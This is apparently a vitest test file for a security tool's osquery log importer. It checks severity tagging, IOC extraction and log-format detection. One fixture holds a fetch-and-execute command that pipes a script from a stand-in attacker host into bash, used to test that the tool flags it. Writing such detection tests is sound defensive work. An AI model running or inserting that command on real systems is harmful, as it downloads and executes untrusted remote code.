import { describe, it, expect } from "vitest";
import { parseOsqueryLog } from "../../src/analysis/osqueryImport.js";
import { detectImportKind } from "../../src/analysis/importDetect.js";

function line(over: object): object {
  return {
    name: "pack/incident-response/process_events",
    hostIdentifier: "workstation-1",
    calendarTime: "Tue Aug 1 12:00:00 2024 UTC",
    unixTime: 1722513600,
    epoch: 0,
    counter: 1,
    action: "added",
    columns: { pid: "1234", path: "/usr/bin/wget", cmdline: "wget http://x/a", uid: "0" },
    ...over,
  };
}
function ndjson(...ls: object[]): string {
  return ls.map((l) => JSON.stringify(l)).join("\n");
}

describe("parseOsqueryLog — result-log mapping", () => {
  it("maps a differential row to Info evidence, reads unixTime, tags host + IOCs", () => {
    const r = parseOsqueryLog(ndjson(line({})));
    expect(r.format).toBe("osquery");
    const e = r.events[0];
    expect(e.severity).toBe("Info");
    expect(e.timestamp).toBe("2024-08-01T12:00:00.000Z"); // unixTime → ISO
    expect(e.asset).toBe("workstation-1");
    expect(e.sources).toEqual(["osquery"]);
    expect(e.description).toContain("process_events");
    expect(e.description).toContain("[added]");
    const vals = r.iocs.map((i) => `${i.type}:${i.value}`);
    expect(vals).toContain("file:/usr/bin/wget");
    expect(vals).toContain("process:wget");
  });

  it("bumps a row whose cmdline column matches attacker tradecraft (curl|bash fetch-execute)", () => {
    const r = parseOsqueryLog(ndjson(line({
      columns: { pid: "9", path: "/bin/bash", cmdline: "curl http://evil.tld/s.sh | bash", uid: "0" },
    })));
    expect(["Medium", "High"]).toContain(r.events[0].severity);
    expect(r.events[0].mitreTechniques).toContain("T1059.004");
    // the fetch URL is scraped from the command line
    expect(r.iocs.map((i) => i.type)).toContain("url");
  });

  it("expands a snapshot into one event per row and extracts a hash IOC", () => {
    const snap = {
      name: "pack/osquery-monitoring/processes",
      hostIdentifier: "host2", unixTime: 1722513600, action: "snapshot",
      snapshot: [
        { pid: "1", name: "systemd", path: "/usr/lib/systemd/systemd" },
        { pid: "2", name: "curl", path: "/usr/bin/curl", sha256: "a".repeat(64) },
      ],
    };
    const r = parseOsqueryLog(ndjson(snap));
    expect(r.events.length).toBe(2);
    expect(r.iocs.map((i) => `${i.type}:${i.value}`)).toContain(`hash:${"a".repeat(64)}`);
  });

  it("handles empty input", () => {
    expect(parseOsqueryLog("").format).toBe("empty");
  });
});

describe("detectImportKind — routes osquery result logs", () => {
  it("detects an osquery differential line as osquery", () => {
    expect(detectImportKind("osqueryd.results.log", ndjson(line({})))).toBe("osquery");
  });
  it("detects an osquery snapshot line as osquery", () => {
    const snap = { name: "q", hostIdentifier: "h", unixTime: 1722513600, action: "snapshot", snapshot: [{ a: "1" }] };
    expect(detectImportKind("snap.log", ndjson(snap))).toBe("osquery");
  });
});
